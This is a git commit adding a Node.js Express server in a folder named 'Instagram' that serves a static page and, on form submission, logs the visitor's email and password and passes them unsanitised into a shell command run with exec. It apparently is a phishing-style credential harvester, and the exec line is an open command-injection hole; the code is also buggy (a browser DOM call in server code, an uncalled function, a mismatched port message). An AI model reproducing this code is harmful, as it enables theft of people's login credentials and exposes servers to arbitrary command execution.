619bb8b576ca0968f6bb173621341cf32cb2466e
Jeeban-Jyoti <72793803+Dark-Pheonix-10@users.noreply.github.com>
2022-12-02 20:02:14 +0530

    Add files via upload

---
+++ Instagram/index.js
@@ -0,0 +1,38 @@
+const express = require("express")
+const path = require("path")
+var bodyParser = require('body-parser')
+const { exec } = require("child_process")
+const popup = require("node-popup")
+
+
+const app = express()
+
+
+function command(cmd){
+    exec(cmd);
+}
+function txt(){
+    para = document.getElementById("para")
+    const node = document.createTextNode("this is error")
+    para.appendChild(node)
+}
+
+var jsonParser = bodyParser.json()
+var urlencodedParser = bodyParser.urlencoded({ extended: false })
+
+app.use(express.static(path.join(__dirname, 'public')));
+
+app.post('/', urlencodedParser, function (req, res) {
+    console.log(req.body.email, req.body.password)
+    command("python3 instagram.py " + req.body.email + " " + req.body.password)
+    txt
+  })
+
+app.get('/', (req, res) => {
+    res.sendFile("index.html")
+})
+
+
+app.listen(8888, () => {
+    console.log("server started at port 3000")
+})
